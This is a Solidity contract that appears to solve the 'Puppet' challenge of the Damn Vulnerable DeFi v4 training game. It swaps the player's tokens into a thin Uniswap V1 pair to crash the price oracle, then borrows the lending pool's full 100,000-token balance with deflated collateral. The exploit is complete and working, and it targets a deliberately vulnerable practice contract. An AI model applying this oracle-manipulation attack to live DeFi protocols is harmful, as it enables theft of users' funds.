// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../DamnValuableToken.sol";
import {PuppetPool} from "../PuppetPool.sol";
import {IUniswapV1Exchange} from "../IUniswapV1Exchange.sol";
import {console2} from "forge-std/console2.sol";

contract AttackPuppetPool {
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    constructor(address tokenAddress, address poolAddress, address recovery) payable {
        DamnValuableToken token = DamnValuableToken(tokenAddress);
        PuppetPool pool = PuppetPool(poolAddress);

        IUniswapV1Exchange uniswapExchange = IUniswapV1Exchange(pool.uniswapPair());

        // Pull all DVT tokens from player
        token.transferFrom(tx.origin, address(this), PLAYER_INITIAL_TOKEN_BALANCE);

        // Approve Uniswap to spend our tokens
        token.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);

        console2.log("Before swap - ETH in pair:", address(uniswapExchange).balance);
        console2.log("Before swap - DVT in pair:", token.balanceOf(address(uniswapExchange)));

        // Swap all 1000 DVT tokens for ETH - this crashes the price AND gives us more ETH
        uint256 ethReceived = uniswapExchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE, // tokens to sell
            1, // min ETH (we don't care)
            block.timestamp + 300 // deadline
        );

        console2.log("ETH received from swap:", ethReceived);
        console2.log("After swap - ETH in pair:", address(uniswapExchange).balance);
        console2.log("After swap - DVT in pair:", token.balanceOf(address(uniswapExchange)));
        console2.log("Required collateral for 100k tokens:", pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
        console2.log("Total ETH available:", msg.value + ethReceived);

        // Borrow all tokens with crashed price using original ETH + swap proceeds
        pool.borrow{value: msg.value + ethReceived}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    // Receive ETH from Uniswap swap
    receive() external payable {}
}
